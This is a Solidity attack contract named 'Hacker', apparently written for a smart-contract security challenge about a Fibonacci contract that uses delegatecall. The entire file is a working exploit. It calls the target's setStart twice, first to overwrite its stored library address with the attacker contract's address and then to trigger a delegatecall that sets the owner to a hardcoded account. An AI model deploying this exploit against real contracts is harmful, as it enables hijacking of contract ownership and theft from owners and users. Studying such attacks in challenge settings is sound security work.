// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IFibContact {
	function setStart(uint n) external;
}


contract  Hacker {
	IFibContact public toAttack;

    address public owner;

	constructor(address _fibContract) {
	   toAttack = IFibContact(_fibContract);
	}

	function toHack() external {
		toAttack.setStart(
			uint(
				uint160(address(this))
			)
		);

		toAttack.setStart(0);
	}

	function setStart(uint) external {
		owner = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148;
	}
}